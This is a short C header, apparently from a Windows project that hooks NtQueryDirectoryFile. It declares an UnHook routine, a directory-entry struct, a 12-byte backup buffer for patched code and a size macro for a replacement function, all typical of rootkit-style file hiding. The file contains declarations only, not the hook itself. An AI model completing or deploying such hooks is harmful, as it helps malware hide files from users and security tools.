#pragma once
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <string.h>
void UnHook(LPWSTR Target, LPWSTR Func);
typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;

BYTE Backup_code[12];

#define NewNtQueryDirectoryFile_size  (ULONGLONG)NewNtQueryDirectoryFile - (ULONGLONG)DumyFunc;
#define Lower(s1) s1 >= 65 && s1 <= 90 ? (wchar_t)s1 + 32 : s1
